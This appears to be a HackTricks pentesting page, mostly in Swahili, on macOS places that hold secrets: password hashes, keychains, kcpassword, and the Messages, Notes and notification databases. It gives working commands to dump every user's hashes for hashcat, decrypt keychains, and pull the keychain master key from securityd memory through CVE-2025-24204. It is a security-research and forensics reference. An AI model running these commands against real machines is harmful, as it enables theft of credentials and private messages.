# Maeneo Nyeti ya macOS na Daemons za Kuvutia

{{#include ../../../banners/hacktricks-training.md}}

## Nywila

### Nywila za Shadow

Shadow password huhifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizo katika **`/var/db/dslocal/nodes/Default/users/`**.\
One-liner ifuatayo inaweza kutumika kutoa **maelezo yote kuhusu watumiaji** (ikiwemo taarifa za hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts kama huu**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) au [**hii**](https://github.com/octomagon/davegrohl.git) zinaweza kutumika kubadilisha hash kuwa **hashcat** **format**.

Njia mbadala ya one-liner ambayo itadump creds za akaunti zote zisizo za service katika hashcat format `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Njia nyingine ya kupata `ShadowHashData` ya mtumiaji ni kwa kutumia `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Faili hii inatumika **tu** wakati system id inaendeshwa katika **single-user mode** (kwa hiyo si mara nyingi sana).

### Keychain Dump

Kumbuka kwamba unapoitumia binary ya security ili **dump the passwords decrypted**, ma-prompt kadhaa yataomba mtumiaji aruhusu operesheni hii.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
On modern macOS the most interesting backing stores are usually **`~/Library/Keychains/login.keychain-db`** and **`/Library/Keychains/System.keychain`**. They are SQLite-backed files, but plaintext access is still brokered by **`securityd`**: stealing the raw DB mainly gives you metadata and encrypted blobs unless you also recover the user's password, `SystemKey`, or an in-memory master key.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) inaonekana zana hizi hazifanyi kazi tena katika Big Sur.

### Muhtasari wa Keychaindump

Zana iitwayo **keychaindump** imeundwa kutoa passwords kutoka kwenye macOS keychains, lakini inakabiliwa na vikwazo kwenye matoleo mapya ya macOS kama Big Sur, kama inavyoonyeshwa katika [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji mshambulizi kupata access na kuinua privileges hadi **root**. Zana hii hutumia ukweli kwamba keychain hufunguliwa kwa chaguo-msingi user anapoingia kwa urahisi, ikiruhusu applications kuipata bila kuhitaji password ya user mara kwa mara. Hata hivyo, ikiwa user ataamua kufunga keychain yake baada ya kila matumizi, **keychaindump** huwa haifanyi kazi.

**Keychaindump** hufanya kazi kwa kulenga process mahususi iitwayo **securityd**, inayofafanuliwa na Apple kama daemon ya authorization na cryptographic operations, muhimu kwa kupata access ya keychain. Mchakato wa extraction unahusisha kutambua **Master Key** inayotokana na password ya login ya user. Key hii ni muhimu kwa kusoma keychain file. Ili kupata **Master Key**, **keychaindump** huchambua memory heap ya **securityd** kwa kutumia `vmmap` command, ikitafuta key zinazoweza kuwa ndani ya maeneo yaliyowekwa alama kama `MALLOC_TINY`. Command ifuatayo hutumiwa kukagua memory locations hizi:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Baada ya kutambua master keys zinazowezekana, **keychaindump** hutafuta kupitia heaps kwa pattern mahususi (`0x0000000000000018`) inayoonyesha candidate ya master key. Hatua zaidi, ikiwemo deobfuscation, zinahitajika ili kutumia key hii, kama ilivyoelezwa katika source code ya **keychaindump**. Wataalamu wanaozingatia eneo hili wanapaswa kutambua kwamba data muhimu kwa decrypting keychain huhifadhiwa ndani ya memory ya process ya **securityd**. Mfano wa command ya kuendesha **keychaindump** ni:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutumika kutoa aina zifuatazo za taarifa kutoka kwa OSX keychain kwa njia inayofaa kwa uchunguzi wa forensics:

- Nenosiri la Keychain lililohashiwa, linalofaa kwa cracking na [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Ukiwa na nenosiri la kufungua keychain, master key iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama SystemKey, Chainbreaker pia itatoa nenosiri za plain text.

Bila mojawapo ya njia hizi za kufungua Keychain, Chainbreaker itaonyesha taarifa nyingine zote zinazopatikana.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dampo funguo za keychain (pamoja na passwords) kwa SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dampu funguo za keychain (zenye passwords) kwa kuvunja hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumu funguo za keychain (zenye nywila) kwa memory dump**

[Fuata hatua hizi](../index.html#dumping-memory-with-osxpmem) ili kufanya **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dampo funguo za keychain (na nywila) kwa kutumia nenosiri la mtumiaji**

Ikiwa unajua nenosiri la mtumiaji unaweza kulitumia ku**dump** na kusimbua keychains zinazomilikiwa na mtumiaji.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Ufunguo mkuu wa Keychain kupitia entitlement ya `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) ilikuja na `/usr/bin/gcore` ikiwa na **`com.apple.system-task-ports.read`** entitlement, kwa hiyo local admin yoyote (au malicious signed app) angeweza dump **kumbukumbu ya process yoyote hata ukiwa na SIP/TCC enforced**. Kutoa dump ya `securityd` hufichua **Keychain master key** kwa clear na hukuruhusu decrypt `login.keychain-db` bila password ya user.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Mlisha ufunguo wa hex uliotolewa kwa Chainbreaker (`--key <hex>`) ili kusimba keychain ya login. Apple iliondoa entitlement katika **macOS 15.3+**, kwa hiyo hii inafanya kazi tu kwenye builds za Sequoia ambazo hazijapatchwa au kwenye systems ambazo zilibaki na binary yenye udhaifu.

### kcpassword

Faili ya **kcpassword** ni faili inayohifadhi **neno la siri la kuingia la mtumiaji**, lakini tu kama mmiliki wa mfumo amewasha **automatic login**. Kwa hiyo, mtumiaji ataingia kiotomatiki bila kuulizwa neno la siri (ambayo si salama sana).

Neno la siri huhifadhiwa kwenye faili **`/etc/kcpassword`** likiwa limexorwa na ufunguo **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ikiwa neno la siri la watumiaji ni refu kuliko ufunguo, ufunguo utatumika tena.\
Hii inafanya neno la siri kuwa rahisi sana kurejesha, kwa mfano kwa kutumia scripts kama [**hii**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Maelezo ya Kuvutia kwenye Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Arifa

Kabla ya **Sequoia**, kwa kawaida unaweza kupata hifadhi ya Notification Center katika **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Katika **Sequoia+** Apple ilihamisha hadi kwenye TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Sehemu kubwa ya taarifa za kuvutia huhifadhiwa ndani ya safu wima za **blob**, kwa hiyo utahitaji kutoa maudhui hayo na kuyabadilisha kuwa kitu kinachosomwa na binadamu (`plutil -p -`, `strings`, au parser ndogo). Mifano ya haraka ya triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Masuala ya hivi karibuni ya faragha (NotificationCenter DB)

- Katika macOS **14.7–15.1** Apple ilihifadhi maudhui ya banner katika SQLite ya `db2/db` bila kuficha ipasavyo. CVEs **CVE-2024-44292/44293/40838/54504** ziliruhusu mtumiaji yeyote wa ndani kusoma maandishi ya notification ya watumiaji wengine kwa kufungua tu DB (hakukuwa na TCC prompt).
- Apple ilipunguza tatizo hili kwa kuhamisha DB kwenda `group.com.apple.usernoted` na kuilinda kwa TCC kwenye builds mpya za Sequoia, hivyo kwenye systems za sasa kwa kawaida unahitaji user context sahihi au TCC bypass ili kuisoma.
- Kwenye legacy endpoints, nakili faili `db`, `db-wal`, na `db-shm` pamoja kabla ya updating au rebooting ikiwa unataka kuhifadhi artefacts.

### Notes

The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
If the one-liner above is too noisy, export `ZICNOTEDATA.ZDATA`, gunzip it, and parse the protobuf: hii kwa kawaida ni ya kuaminika zaidi kuliko kuendesha `strings` moja kwa moja kwenye SQLite.

### Background Tasks / Login Items

Tangu **Ventura**, user-approved login items na several background tasks hufuatiliwa katika **BTM** stores kama **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** na system cache yenye toleo **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Faili hizi ni muhimu ili kutambua haraka persistence, helper tools, na baadhi ya MDM-managed background items:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Kwa upande wa persistence na BTM internals, angalia [ukurasa wa auto-start locations](../../macos-auto-start-locations.md#login-items) na [maelezo ya Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

Katika apps za macOS, preferences ziko ndani ya **`$HOME/Library/Preferences`** na katika iOS ziko katika `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Katika macOS, zana ya cli **`defaults`** inaweza kutumika **kurekebisha faili ya Preferences**.

**`/usr/sbin/cfprefsd`** inadai huduma za XPC `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent` na inaweza kuitwa kufanya actions kama kurekebisha preferences.

## OpenDirectory permissions.plist

Faili `/System/Library/OpenDirectory/permissions.plist` ina permissions zinazotumika kwenye node attributes na inalindwa na SIP.\
Faili hii inatoa permissions kwa users mahususi kwa UUID (na si uid) ili waweze kupata sensitive information maalum kama `ShadowHashData`, `HeimdalSRPKey` na `KerberosKeys` pamoja na nyingine:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Arifa za Mfumo

### Arifa za Darwin

Daemon kuu ya arifa ni **`/usr/sbin/notifyd`**. Ili kupokea arifa, clients lazima zisajiliwe kupitia `com.apple.system.notification_center` Mach port (ziangalie kwa `sudo lsmp -p <pid notifyd>`). Daemon inaweza kusanidiwa kwa faili `/etc/notify.conf`.

Majina yanayotumiwa kwa arifa ni notation za kipekee za reverse DNS, na arifa inapotumwa kwa moja yao, client(s) ambazo zimeonyesha kuwa zinaweza kuishughulikia zitapokea.

Inawezekana kutoa current status (na kuona majina yote) kwa kutuma signal SIGUSR2 kwa process ya notifyd na kusoma faili iliyotengenezwa: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** ambayo binary kuu yake ni **`/usr/sbin/distnoted`**, ni njia nyingine ya kutuma notifications. Inaonyesha baadhi ya huduma za XPC na hufanya baadhi ya ukaguzi ili kujaribu kuthibitisha clients.

### Apple Push Notifications (APN)

Katika kesi hii, applications zinaweza kujisajili kwa **topics**. Client atatengeneza token kwa kuwasiliana na servers za Apple kupitia **`apsd`**.\
Kisha, providers, pia watakuwa wametengeneza token na wataweza kuunganishwa na servers za Apple kutuma messages kwa clients. Messages hizi zitapokelewa locally na **`apsd`** ambayo itapitisha notification kwa application inayoisubiri.

Preferences zipo katika `/Library/Preferences/com.apple.apsd.plist`.

Kuna local database ya messages iliyoko katika macOS kwenye `/Library/Application\ Support/ApplePushService/aps.db` na katika iOS kwenye `/var/mobile/Library/ApplePushService`. Ina tables 3: `incoming_messages`, `outgoing_messages` na `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Pia pia inawezekana kupata taarifa kuhusu daemon na miunganisho kwa kutumia:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Arifa za Mtumiaji

Hizi ni arifa ambazo mtumiaji anapaswa kuona kwenye skrini:

- **`CFUserNotification`**: API hizi hutoa njia ya kuonyesha pop-up kwenye skrini yenye ujumbe.
- **The Bulletin Board**: Hii huonyesha katika iOS banner inayotoweka na itahifadhiwa katika Notification Center.
- **`NSUserNotificationCenter`**: Hii ni The Bulletin Board ya iOS katika MacOS. Kwenye matoleo ya zamani ya macOS hifadhidata kawaida huishi katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; kwenye Sequoia+ ilihamishwa kwenda `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Marejeo

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
